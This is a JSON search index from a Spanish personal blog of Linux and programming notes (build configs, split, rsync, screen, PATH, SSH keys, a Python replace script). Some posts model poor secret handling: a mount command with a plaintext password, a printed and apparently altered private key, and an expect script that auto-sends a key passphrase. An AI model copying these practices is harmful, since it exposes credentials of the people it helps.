\u0026#34;cmd\u0026#34; : [\u0026#34;g++\u0026#34;, \u0026#34;-Wall\u0026#34;, \u0026#34;$file_name\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;${file_base_name}.exe\u0026#34;, \u0026#34;\u0026amp;\u0026amp;\u0026#34;, \u0026#34;${file_base_name}.exe\u0026#34;], \u0026#34;selector\u0026#34;: \u0026#34;source.c++\u0026#34;, \u0026#34;shell\u0026#34; : true, \u0026#34;working_dir\u0026#34; : \u0026#34;$file_path\u0026#34; } //Linux { \u0026#34;cmd\u0026#34; : [\u0026#34;g++\u0026#34;, \u0026#34;-Wall\u0026#34;, \u0026#34;$file_name\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;${file_base_name}\u0026#34;, \u0026#34;\u0026amp;\u0026amp;\u0026#34;, \u0026#34;${file_base_name}\u0026#34;], \u0026#34;selector\u0026#34;: \u0026#34;source.c++\u0026#34;, \u0026#34;shell\u0026#34; : true, \u0026#34;working_dir\u0026#34; : \u0026#34;$file_path\u0026#34; } Cuando lo hallamos hecho, guardamos dicho archivo en la carpeta donde nos sugiere Sublime Text, y le ponemos un nombre descriptivo como por ejemplo C++.sublime-build, ten cuidado que la extensión del archivo sea .sublime-build.\nY con eso ya hemos terminado, para compilar y ejecutar nuestros programas en C++ tan solo debes ir a Tools -\u0026gt; Build System y elegir el nombre del archivo que has modificado ante.,\nFuentes: 1\n","date":"2015-12-23T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/compilar_c-_sublimetext/","title":"Compilar C++ con Sublimetext 2"},{"content":"mount -t cifs //192.168.1.58/G/DescargasPi /mnt/DescargasPi -o username=procamora,password=adsasdasd\nhttps://wiki.ubuntu.com/MountWindowsSharesPermanently\n","date":"2015-12-22T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/carpetas-compartidas-samba/","title":"carpetas-compartidas-samba"},{"content":"El programa split es una utilidad de los sistemas operativos tipo Unix, usada para partir un archivo en uno o más de menor tamaño. De ahí su nombre, que en inglés significa partir.\nSintaxis: split [parámetros opcionales] [archivo de entrada] [archivo de salida]\nEl comportamiento por defecto de split es generar archivos de salida de hasta 1000 líneas. Estos archivos se nombran añadiéndole aa, ab, ac, etcétera, a archivo de salida; si no se da el nombre del archivo de salida, se usa el nombre por defecto de x, resultando en los archivos xaa, xab, etcétera. Si se usa un guion (-) como archivo de entrada, se leen los datos de la entrada estándar.\nPara unir de nuevo los archivos se usa el comando cat.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ split --help Usage: split [OPTION]... [INPUT [PREFIX]] Output fixed-size pieces of INPUT to PREFIXaa, PREFIXab, ...; default size is 1000 lines, and default PREFIX is `x\u0026#39;. With no INPUT, or when INPUT is -, read standard input. Mandatory arguments to long options are mandatory for short options too. -a, –suffix-length=N utiliza sufijos de longitud N (por omisión 2) -b, –bytes=TAMAÑO escribe TAMAÑO bytes en cada fichero de salida -C, –line-bytes=BYTES escribe un máximo de BYTES bytes sin cortar líneas -d, –numeric-suffixes utiliza sufijos numéricos en vez de alfabéticos -e, --elide-empty-files do not generate empty output files with `-n\u0026#39; --filter=COMMAND write to shell COMMAND; file name is $FILE -l, –lines=NÚMERO pone NÚMERO de líneas en cada fichero de salida -n, --number=CHUNKS generate CHUNKS output files. See below -u, --unbuffered immediately copy input to output with `-n r/...\u0026#39; --verbose print a diagnostic just before each output file is opened --help display this help and exit --version output version information and exit SIZE may be (or may be an integer optionally followed by) one of following: KB 1000, K 1024, MB 1000*1000, M 1024*1024, and so on for G, T, P, E, Z, Y. CHUNKS may be: N split into N files based on size of input K/N output Kth of N to stdout l/N split into N files without splitting lines l/K/N output Kth of N to stdout without splitting lines r/N like `l\u0026#39; but use round robin distribution r/K/N likewise but only output Kth of N to stdout #Dividir\n#####Partir por tamaño de fichero de 20Mb split dict.lst -b 20MB\nY el resultado:\n1 2 3 4 5 6 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 xaa -rw-rw-r-- 1 user user 20000 Mar 12 20:48 xab -rw-rw-r-- 1 user user 20000 Mar 12 20:48 xac -rw-rw-r-- 1 user user 20000 Mar 12 20:48 xad -rw-rw-r-- 1 user user 20000 Mar 12 20:48 xae -rw-rw-r-- 1 user user 20000 Mar 12 20:48 xaf #####Partir por tamaño de fichero de 20Mb con nombre con letras split dict.lst -b 20MB dict_\nY el resultado:\n1 2 3 4 5 6 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict_aa -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict_ab -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict_ac -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict_ad -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict_ae -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict_af #####Partir por tamaño de fichero de 20Mb con nombre con números split dict.lst -b 20MB -d dict\nY el resultado:\n1 2 3 4 5 6 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict00 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict01 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict02 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict03 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict04 -rw-rw-r-- 1 user user 20000 Mar 12 20:48 dict05 #####Partir por cada 20000 lineas split dict.lst -l 20000\nY el resultado:\n1 2 3 4 5 6 -rw-rw-r-- 1 user user 2000 Mar 12 20:48 xaa -rw-rw-r-- 1 user user 2000 Mar 12 20:48 xab -rw-rw-r-- 1 user user 2000 Mar 12 20:48 xac -rw-rw-r-- 1 user user 2000 Mar 12 20:48 xad -rw-rw-r-- 1 user user 2000 Mar 12 20:48 xae -rw-rw-r-- 1 user user 2000 Mar 12 20:48 xaf Unir cat dict* \u0026gt; dict.lst\nhttp://hipertextual.com/archivo/2010/04/comando-linux-split/\n","date":"2015-12-21T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/comando_split/","title":"Comando Split"},{"content":".ssh/config\n1 2 3 4 5 6 7 8 9 10 11 12 13 Host github.com User git HostName github.com IdentityFile ~/.ssh/github.project1.key Host bitbucket.org User git HostName bitbucket.org IdentityFile ~/.ssh/github.org.key Host github.com User git IdentityFile ~/.ssh/github.key http://nerderati.com/2011/03/17/simplify-your-life-with-an-ssh-config-file/\n","date":"2015-12-20T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/ssh_configfile/","title":"ssh_configfile"},{"content":"fichero OpenSSH.GitHub\ncat ~/.ssh/OpenSSH.GitHub\n1 2 3 4 5 6 7 8 9 10 11 12 13 -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: DES-EDE3-CBC,4AFCBF8D0AF1ABB6 +G1vplr+DfWb2h/a04BfdsfdsffYcqewrwrewvH5RYcqi4Q4eqhjj5UIXF6cQ5ZY pqIWBBmC3sIwkztnCZC5KqMYjLy9hbDdFQ5EplW3QN7wV9Bs2PXRl0NIDWMBicjS em+jS0365JIle+ofYPeGiZIjZq6VxUQJeVgIFG56AWP/Vq9nvHjvblwOl5rFQaLh nDJT+06jmkhFlN6sdfdfdsfdfS4MdOlPQkJBvfdhOJ4viUYfdjspy2NjuMvXH2Wb rIHC0wtYFiNhPTCeCXfEXqv7Fhw2bBZM//W/oqleyz+Y5EBlWZLcyqG6FYtHTEkL Mh6Y4NL8XMqg3Gly9PKH0RfT2mJYJhN1ni1KBn6H6SXzlLU5bKgfM8aNJ9RVS9it rQ4B38i8HuoS6lOvIAdsfsdffffssffODyrMi0kREuvQC5fhfuQB83cn1lx5u/Ut ETC...... -----END RSA PRIVATE KEY----- Creamos el directorio para las claves y ponemos las claves en el con los permisos adecuados\n1 2 3 4 5 mkdir -p ~/.ssh touch ~/.ssh/OpenSSH.GitHub vim ~/.ssh/OpenSSH.GitHub # guardamos el contenido de la clave privada chmod 600 ~/.ssh/OpenSSH.GitHub # le quitamos los permisos necesarios ssh-add ~/.ssh/OpenSSH.GitHub # ponemos la contraseña y ya tenemos cargala la clave Si obtenemos este error al cargar la clave con ssh-add OpenSSH:\n1 Could not open a connection to your authentication agent. Entonces tendremos que ejecutar eval $(ssh-agent) y colocarlo al final de .bashrc para que se ejecute al inicio de cada sesión.\nssh -T git@github.com\n1 2 Resultado Hi procamora! You\u0026#39;ve successfully authenticated, but GitHub does not provide shell access. Para hacer que se auto cargue la clave al inicio de la sesión crear un script como este y ponerlo en el arranque de linux, para descargarlo pulse aquí\n1 2 3 4 5 6 7 8 #!/usr/bin/expect -f set USER [exec whoami] spawn ssh-add /home/$USER/.ssh/OpenSSH expect \u0026#34;Enter passphrase for /home/$USER/.ssh/OpenSSH:\u0026#34; send \u0026#34;PASSWORD$\\n\u0026#34;; interact Fuentes: stackexchange\n","date":"2015-12-19T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/privatekey_linux/","title":"Privatekey_linux"},{"content":"Eclipse codifica los ficheros por defecto con ANSI, para cambiar la codificación por defecto ir a:\nWindow / Preferences / General / Content types\nSeleccionar Text en la lista de Content Types y en default enconding poner UTF-8\n","date":"2015-12-18T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/cambiarcodificacioneclipse/","title":"Cambiar codificación en Eclipse"},{"content":"En esta entrada veremos como configurar Sublime Text 2 para que al presionar ctrl + b se compile y ejecute nuestra aplicación en C.\nLo primero que debemos hacer es iniciar Sublime Text, una vez lo hallamos hecho, vamos a Tools -\u0026gt; Build System -\u0026gt; New Build System\u0026hellip; Esto abrirá un pequeño archivo con unas lineas escritas en JSON, de modo que debemos copiar el siguiente código y pegarlo en este archivo.\nEn mi caso la ruta es: %AppData%\\Sublime Text 2\\Packages\\User\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //Windows { \u0026#34;cmd\u0026#34; : [\u0026#34;gcc\u0026#34;, \u0026#34;-Wall\u0026#34;, \u0026#34;$file_name\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;${file_base_name}.exe\u0026#34;, \u0026#34;\u0026amp;\u0026amp;\u0026#34;, \u0026#34;${file_base_name}.exe\u0026#34;], \u0026#34;selector\u0026#34; : \u0026#34;source.c\u0026#34;, \u0026#34;shell\u0026#34; : true, \u0026#34;working_dir\u0026#34; : \u0026#34;$file_path\u0026#34; } //Linux { \u0026#34;cmd\u0026#34; : [\u0026#34;gcc\u0026#34;, \u0026#34;-Wall\u0026#34;, \u0026#34;$file_name\u0026#34;, \u0026#34;-o\u0026#34;, \u0026#34;${file_base_name}\u0026#34;, \u0026#34;\u0026amp;\u0026amp;\u0026#34;, \u0026#34;${file_base_name}\u0026#34;], \u0026#34;selector\u0026#34; : \u0026#34;source.c\u0026#34;, \u0026#34;shell\u0026#34; : true, \u0026#34;working_dir\u0026#34; : \u0026#34;$file_path\u0026#34; } Cuando lo hallamos hecho, guardamos dicho archivo en la carpeta donde nos sugiere Sublime Text, y le ponemos un nombre descriptivo como por ejemplo C.sublime-build, ten cuidado que la extensión del archivo sea .sublime-build.\nY con eso ya hemos terminado, para compilar y ejecutar nuestros programas en C tan solo debes ir a Tools -\u0026gt; Build System y elegir el nombre del archivo que has modificado ante.,\nFuentes: 1\n","date":"2015-12-17T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/compilar_c_sublimetext/","title":"Compilar C con Sublimetext 2"},{"content":"Introducción: El objetivo es modificar el path del sistema operativo. El PATH es la variable del sistema que utiliza el sistema operativo para buscar los ejecutables necesarios desde la línea de comandos o la ventana Terminal. La variable del sistema PATH se puede establecer utilizando la utilidad de sistema en el panel de control de Windows o en el archivo de inicio del shell en Linux y Solaris.\nLinux Para consultar todas las variables de entorno, Linux dispone del comando env\nAlgunas variables importantes son:\n1 2 3 4 5 6 7 SHELL=/bin/bash (el tipo de shell en uso) TERM=xterm (el programa de terminal por defecto) USER=pi (el nombre de usuario) PWD=/home/pi (la ruta por defecto del usuario) LANG=es_ES.utf8 (el juego de caracteres de idioma) DESKTOP_SESSION=KDE (el entorno de escritorio) PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin (el PATH) Para consultar el valor de una en particular usamos echo\n1 echo $PATH ¿Dónde están los archivos de configuración del PATH? Los archivos globales del sistema están en:\n1 2 3 /etc/profile /etc/profile.d/ /etc/.bashrc y los archivos del espacio de usuario:\n1 2 3 ~/.bashrc ~/.bash_profile ~/.zshrc Consola Tenemos dos formas de modificar el PATH, una fija y otra temporal que se borrara una vez que se apague el sistema\nForma temporal Por la terminal introducimos el comando:\n1 PATH=/opt/test/:$PATH Donde Tenemos que cambiar /opt/test/ por el directorio que queramos meter dentro del PATH\nForma fija Edite el archivo de inicio (~/.bashrc) Modifique la variable PATH 1 PATH=/opt/test/:$PATH export PATH Guarde y cierre el archivo Windows Windows permite modificar el PATH tanto graficamente como por consola.\n###Consola\n1 SET PATH=%PATH%;C:\\Program Files\\Java\\jdk1.8.0_65\\bin Gui En Buscar, busque y seleccione: Sistema (Panel de control) Haga clic en el enlace Configuración avanzada del sistema. Haga clic en Variables de entorno. En la sección Variables del sistema, busque la variable de entorno PATH y selecciónela. Haga clic en Editar. Si no existe la variable de entorno PATH, haga clic en Nuevo. En la ventana Editar la variable del sistema (o Nueva variable del sistema), debe especificar el valor de la variable de entorno PATH. Haga clic en Aceptar. Cierre todas las demás ventanas haciendo clic en Aceptar. Vuelva a abrir la ventana del indicador de comandos y ejecute el código de java. Fuentes: [0][java] [1][0] [java]: https://www.java.com/es/download/help/path.xml [0]: https://rootsudo.wordpress.com/2014/04/06/el-path-la-ruta-de-linux-variables-de-entorno/\n","date":"2015-12-16T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/actualizar-variables-entorno/","title":"Actualizar variables entorno"},{"content":"ps aux \u0026ndash;width 30 \u0026ndash;sort -rss | head\nhttp://blog.desdelinux.net/con-el-terminal-mostrar-los-10-procesos-que-mas-memoria-consumen/\n","date":"2015-12-15T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/procesos-que-mas-consumen/","title":"Procesos que mas consumen"},{"content":"En esta entrada veremos como configurar Sublime Text 2 para que al presionar ctrl + b se compile y ejecute nuestra aplicación en java.\nLo primero que debemos hacer es iniciar Sublime Text, una vez lo hallamos hecho, vamos a Tools -\u0026gt; Build System -\u0026gt; New Build System\u0026hellip; Esto abrirá un pequeño archivo con unas lineas escritas en JSON, de modo que debemos copiar el siguiente código y pegarlo en este archivo.\nEn mi caso la ruta es: %AppData%\\Sublime Text 2\\Packages\\User\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //--- title: Arduino burn bootloader description: date: lastmod: slug: image: \u0026#34;covers/software.png\u0026#34; tags: - arduino categories: - Software --- Windows y Liunx { \u0026#34;cmd\u0026#34;: [\u0026#34;javac ${file_name} \u0026amp;\u0026amp; java ${file_base_name}\u0026#34;], \u0026#34;selector\u0026#34;: \u0026#34;source.java\u0026#34;, \u0026#34;shell\u0026#34; : true, } Cuando lo hallamos hecho, guardamos dicho archivo en la carpeta donde nos sugiere Sublime Text, y le ponemos un nombre descriptivo como por ejemplo java.sublime-build, ten cuidado que la extensión del archivo sea .sublime-build.\nY con eso ya hemos terminado, para compilar y ejecutar nuestros programas en java tan solo debes ir a Tools -\u0026gt; Build System y elegir el nombre del archivo que has modificado ante.,\nFuentes: 1\n","date":"2015-12-14T00:00:00Z","image":"https://www.procamora.com/covers/software.png","permalink":"https://www.procamora.com/p/compilar_java_sublimetext/","title":"Compilar Java con Sublimetext 2"},{"content":"Para parsear un fichero con python y remplazar ciertos ficheros el código seria algo como este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 TEMPLATE = \u0026#34;\u0026#34;\u0026#34;Title: {title} Date: {year}-{month}-{day} {hour}:{minute:02d} Modified: {year}-{month}-{day} {hour}:{minute:02d} Category: Tags: Slug: {slug} Summary: Status: draft \u0026#34;\u0026#34;\u0026#34; t = TEMPLATE.strip().format(title=title, year=today.year, month=today.month, day=today.day, hour=today.hour, minute=today.minute, slug=slug) f_create = \u0026#34;fichero.txt\u0026#34; with open(f_create, \u0026#39;w\u0026#39;) as w: w.write(t) print(\u0026#34;File created -\u0026gt; \u0026#34; + f_create) ","date":"2015-12-13T00:00:00Z","image":"https://www.procamora.com/covers/programming.png","permalink":"https://www.procamora.com/p/parsearfichero/","title":"Parsear Fichero"},{"content":"En gnome shell para poder crear un fichero con el menú contextual tenemos que crear un documento nuevo (con gedit o cualquier otro editor de texto) y guardarlo vacío dentro la carpeta ~/Plantillas (templates) de nuestro directorio personal. El nombre que elijáis será el que os aparezca después en el menú de nautilus (Files).\nUna vez creado el documento, lanzamos el ejecutor de órdenes con la combinación de teclas Alt+F2 y reiniciamos Gnome Shell con la orden r\nY ya tenemos la función de crear documento nuevo activada\n","date":"2015-12-08T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/crearmenucrearfichero/","title":"Crear Fichero con el menú contextual"},{"content":"Title: Crear Lanzador GnomeShell Date: 2015-12-6 17:30 Category: Linux Tags: linux, gnome shell Slug: crearlanzadorgnomeshell Summary: Para crear accesos directos en el menu de gnome shell tienes que tener un fichero en. Status: published\nBelow is a sample of desktop file:\n1 2 3 4 5 6 7 8 9 [Desktop Entry] Type=Application Encoding=UTF-8 Name=Application Name Comment=Application description Icon=/path/to/icon.xpm Exec=/path/to/application/executable Terminal=false Categories=Tags;Describing;Application Explanation\n[Desktop Entry] the Desktop Entry group header identifies the file as a desktop entry Type the type of the entry, valid values are Application, Link and Directory Encoding the character encoding of the desktop file Name the application name visible in menus or launchers Comment a description of the application used in tooltips Icon the icon shown for the application in menus or launchers Exec the command that is used to start the application from a shell. Terminal whether the application should be run in a terminal, valid values are true or false Categories semi-colon (;) separated list of menu categories in which the entry should be shown Command line arguments in the Exec key can be signified with the following variables:\n%f a single filename. %F multiple filenames. %u a single URL. %U multiple URLs. %d a single directory. Used in conjunction with %f to locate a file. %D multiple directories. Used in conjunction with %F to locate files. %n a single filename without a path. %N multiple filenames without paths. %k a URI or local filename of the location of the desktop file. %v the name of the Device entry. Este serie un ejemplo de un fichero\nvim /usr/share/applications/thunderbird.desktop\n1 2 3 4 5 6 7 8 9 [Desktop Entry] Encoding=UTF-8 Name=Thunderbird Comment=Access the Internet Exec=/opt/thunderbird/thunderbird Terminal=false Icon=/opt/thunderbird/icons/logo.png Type=Application Categories=Networkr; ##Importante Para hacer que se pueda hacer: \u0026ldquo;abrir con\u0026rdquo; de cualquier tipo de fichero/extension hay que añadir %F\nExec=geany %F\nFuentes: 1\n","date":"2015-12-06T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/crearlanzadorgnomeshell/","title":"Crear Lanzador GnomeShell"},{"content":"GNU Screen es una herramienta destinada a la terminal de Linux con la que se puede crear y manejar varias sesiones y programas de manera simultanea desde una sola terminal.\nPero además, permite cerrar la terminal y volverse a conectar a la sesión de screen que conservará las \u0026ldquo;terminales virtuales\u0026rdquo; que tuviéramos abiertas.\nInstalar: sudo apt-get install screen\n###Opciones básicas\n1 2 3 4 -S sockname Da nombre a la sesión [pid].sockname. ls Lista las sesiones abiertas de screen. -r Reattach a un sesión. Es posible especificar el nombre ej: screen -r sockname -t título Permite dar un título a una ventana. Ejemplo: screen -S NombreSesion -t NombreVentana\n###Manejo de las ventanas\n1 2 3 4 5 6 7 8 9 10 [Ctrl]+[A],[C] Nos permite abrir más terminales virtuales [Ctrl]+[A],[N] Nos permite cambiar de una terminal a otra [Ctrl]+[A],[Shift]+[C] Nos permite renombrar el terminal, por defecto todos se llaman bash [Ctrl]+[A],[D] Nos permite cerrar la terminal sin cerrar los procesos que se están ejecutando [Ctrl]+[D] Cierra la terminal, si es la única que tenemos bierta, salir de screen [Ctrl]+[A],[x] Bloquear todas las terminales con una clave [Ctrl]+[A],[?] Nos muestra las combinaciones de teclas Ejemplo de uso: 1 screen Fuentes: [0][0] [1][1] [0]: http://www.muylinux.com/2009/01/05/gestion-remota-desconectando [1]: https://dreyacosta.com/jugando-con-screen-un-manejador-de-sesiones-linux/\n","date":"2015-12-06T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/comando_screen/","title":"Uso de Screen"},{"content":"PC 1 (FUNCIONAL) Sistemas basados en Debian 1 2 #coger todas los paquetes instalados que no sean librerías o common dpkg --get-selections | grep -v deinstall | awk \u0026#39;{print $1}\u0026#39; | egrep -v \u0026#39;^lib.*|common\u0026#39; \u0026gt; i5.tmp Sistemas basados en Fedora 1 dnf list installed | awk \u0026#39;{print $1}\u0026#39; | egrep -v \u0026#39;^lib.*|common\u0026#39; \u0026gt; i5.tmp PC 2 (RECIÉN INSTALADO) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #!/bin/bash #coger todas los paquetes instalados que no sean librerías o common dpkg --get-selections | grep -v deinstall | awk \u0026#39;{print $1}\u0026#39; | egrep -v \u0026#39;^lib.*|common\u0026#39; \u0026gt; i7.tmp diff i5.tmp i7.tmp \u0026gt; test.tmp #limpieza de lineas innecesarias creadas por diff #egrep -v \u0026#39;[0-9]+[a-z]+[0-9]+\u0026#39; test.tmp \u0026gt; test2.tmp # otra forma de sacar las diferencias sed -Ei \u0026#39;/[0-9]+[a-z]+[0-9]+|\u0026gt; |---/d\u0026#39; test.tmp # con -e no funciona, investigar # poner los sudo sed -i \u0026#39;s/\u0026lt; /sudo apt-get -y install /g\u0026#39; test.tmp bash test.tmp EN UN FUTURO HACER UN SCRIPT PASANDO PARÁMETRO PARA HACER USARLO\nscript.py -p origen script.py -p destino script.py -o instalar\n","date":"2015-12-06T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/verdiferentespaquetes/","title":"Ver Diferentes Paquetes"},{"content":"rsync es una herramienta para sincronizar los ficheros y directorios que tenemos almacenados en un sitio en otro diferente minimizando la transferencia de datos\n###Uso:\nrsync [OPTION] SRC DEST\n###Opciones básicas\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 -r: Modo recursivo. -l: Mantiene los enlaces simbólicos. -p: Mantiene los permisos en archivos y subdirectorios. -t: Mantiene la hora y fecha. -g: Mantiene el grupo. -o: Mantiene el dueño (owner). -D: Mantiene los archivos de dispositivo (root). -a: Es el modo Archive. (Usar a es lo mismo que poner -rlptgoD). -t: Preserva los tiempos de modificación de los archivos que están siendo transferidos. -q: Suprime todos los mensajes que no sean de error,es contrario a -v. -d: Copia los archivos de un directorio sin utilizar recursividad para copiar los directorios internos. -l: Copia los symlinks como symlinks -L: Copia los archivo a los que un symlink está apuntando cuando encuentre un symlink. -W: Copia archivos enteros, cuando utilizamos el algoritmo de delta-transfer solo se copia la parte de un archivo que fue actualizada. -h: Muestra la información que provee rsync en un formato más legible (K\u0026#39;s, M\u0026#39;s, G\u0026#39;s). -m: No envía los directorios vacíos. -z: Comprimirá el bloque antes de pasarlo. -n: El comando no haga nada en realidad, se usa para ve si esta bien el script. –upDate: Actualiza los ficheros en el destino SÓLO si el origen de la copia han sido modificados --progress: Muestra el progreso de los archivos que están siendo transferidos. --delete: Borra archivos directorio destino si han sido borrados en origen (sincronizas) --exclude=PATTERN: Excluir archivos que coinciden con la expresión PATTERN --exclude-from=FILE: Obtener el conjunto de expresiones del archivo especificado por FILE --include=PATTERN: No excluir los archivos que coinciden con la expresión PATTERN --include-from=FILE: Obtener el conjunto de expresiones del archivo especificado por FILE --files-from=FILE: Incluir los archivos especificados en el archivo FILE ####include-from el carácter + indica incluir el carácter - indica excluir / matchea con el directorio / /* matchea con todos los archivos en / /** matchea con todos los archivos y directorios en / /*** matchea con todos los archivos y directorios en / e incluso también con / el - * al final indica que lo que no ha sido aceptado hasta entonces se excluya\n1 2 3 4 + */ + /etc/ssh/* + /var/log/* - * ####exclude-from\n1 2 3 4 5 6 *.lnk *.regtrans-ms *.DAT* *.dat* *.LOG* *.log* ###Pc local a pc remoto\nCopia archivos mientras muestra el progreso para cada copia.\n1 rsync -avz --progress /tmp/ user@server.com:/home/pi/algo/ Copia los archivos inferiores en tamaño a 10Mb y superiores a 1MB.\n1 rsync -avz --max-size=\u0026#39;10240k\u0026#39; --min-size=\u0026#39;1024k\u0026#39; ~/Documentos user@server.com:/home/pi/algo/` ###Pc remoto a pc local\nExcluye todos los archivos y directorios excepto los de tipo .zip.\n1 rsync -avz --exclude=\u0026#39;*\u0026#39; --include=\u0026#39;*.zip\u0026#39; user@server.com:/home/pi/algo/ /media/hd2/mibackup Todos los datos se copian y transfieren cifrados sobre ssh.\n1 rsync -avze ssh user@server.com:/home/pi/algo/ /media/hd2/mibackup/ ###Local El que uso habitualmente Copia archivo en modo Archive para sincronizar directorios Muestra el progreso para cada copia Muestro información mas legible, no envió directorios vacíos\n1 rsync -av -hm --delete --progress --exclude-from \u0026#39;exclude.txt\u0026#39; \u0026#34;/cygdrive/c/Users/\u0026#34; /cygdrive/l/BackUp/ ###Rsync con clave privada #EN PROCESO http://troy.jdmz.net/rsync/index.html\n##Importante\nRespecto a cómo pasarle los nombres de los directorios, hay que tener una especial atención respecto a si ponemos una barra al final del nombre del directorio o no, ya que significan cosas distintas:\n1 2 rsync -av /src/foo /dest =\u0026gt; /path/foo significa \u0026#34;el directorio foo\u0026#34; rsync -av /src/foo/ /dest/foo =\u0026gt; /path/foo/ significa \u0026#34;lo que hay dentro de foo\u0026#34; En windows en vez de escribir C:\\ -\u0026gt; /cygdrive/c/ .\nUsar siempre rutas absolutas.\nusar el parámetro -n para evitar eliminar archivos no deseados, el comando no hace nada.\nFuente: 0 1\n","date":"2015-12-03T00:00:00Z","image":"https://www.procamora.com/covers/linux.png","permalink":"https://www.procamora.com/p/2015_12_03_usorsync/","title":"Uso de Rsync"},{"content":"[TOC]\nIntroducción: Vamos a repasar algunos métodos para buscar y remplazar una palabra o expresion regular. Las opciones que vamos a considerar son las siguientes:\nSea recursivo Permite usar expresiones regulares Herramientas nativas Las siguientes herramientas son nativas de linux y posiblemente estén instaladas en todas las distribuciones de linux.\nSearch and replace con egrep Muestra los ficheros que contienen el patrón a buscar con egrep y con sed los remplaza.\nRecursivo: ✔ Regex: ✔ (Con matices, sed no acepta caracteres de búsqueda literal como \\d, pero si [0-9]+) 1 2 3 4 5 #!/bin/bash buscar=\u0026#34;uno?\u0026#34; remplazar=\u0026#34;UNO\u0026#34; ruta=\u0026#34;/tmp/kk\u0026#34; egrep -rl $buscar $ruta | xargs sed -i -E \u0026#34;s/$buscar/$remplazar/g\u0026#34; Search and replace con find Busco los ficheros filtrándolos con find, después con sed remplazo.\nFuncionalidad:\nRecursivo: ✔ Regex: ✔ (Con matices, sed no acepta caracteres de búsqueda literal como \\d, pero si [0-9]+) 1 2 3 4 5 6 #!/bin/bash buscar=\u0026#34;\\d\u0026#34; remplazar=\u0026#34;uno\u0026#34; ruta=\u0026#34;/tmp/kk\u0026#34; filtro=\u0026#39;*\u0026#39; find $ruta -type f -name \u0026#34;$filtro\u0026#34; | xargs sed -i -E \u0026#34;s/$buscar/$remplazar/g\u0026#34; Herramientas externas Search and replace con Python Script hecho en python para buscar y remplazar en un arbol de directorios.\nFuncionalidad:\nRecursivo: ✔ Regex: ✔ Descargar script\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 #!/usr/bin/env python # Fuente: http://code.activestate.com/recipes/580653-recursive-find-replace-in-files-using-regex/ import os import fnmatch import sys import shutil import re import argparse def find_replace(cfg): search_pattern = re.compile(cfg.search_regex) for path, dirs, files in os.walk(os.path.abspath(cfg.dir)): for filename in fnmatch.filter(files, cfg.glob): pardir = os.path.normpath(os.path.join(path, \u0026#39;../../../others/content\u0026#39;)) pardir = os.path.split(pardir)[-1] print \u0026#39;[%s]\u0026#39; % pardir, filepath = os.path.join(path, filename) # backup orig file if cfg.create_backup: backup_path = filepath + \u0026#39;.bak\u0026#39; while os.path.exists(backup_path): backup_path += \u0026#39;.bak\u0026#39; print(\u0026#39;DBG: creating backup\u0026#39;, backup_path) shutil.copyfile(filepath, backup_path) with open(filepath) as f: data = f.read() all_matches = search_pattern.findall(data) if all_matches: one_match = all_matches[0] print(\u0026#39;Found {} matches in file {}\u0026#39;.format(len(all_matches), filename)) if not cfg.dryrun: with open(filepath, \u0026#34;w\u0026#34;) as f: print(\u0026#39;DBG: replacing in file\u0026#39;, filepath) # s = s.replace(search_pattern, replacement) new_data = search_pattern.sub(cfg.replace_regex, data) f.write(new_data) else: for line in data.split(\u0026#39;\\n\u0026#39;): if one_match in line: print(\u0026#34; OLD: {}\u0026#34;.format(line.strip())) print(\u0026#34; NEW: {}\u0026#34;.format(search_pattern.sub(cfg.replace_regex, line).strip())) else: print(\u0026#39;File {} does not contain search regex \u0026#34;{}\u0026#34;\u0026#39;.format(filename, cfg.search_regex)) if __name__ == \u0026#39;__main__\u0026#39;: ejemplo = \u0026#39;./search_replace.py -d \u0026#34;../\u0026#34; -s \u0026#34;tags:\u0026#34; 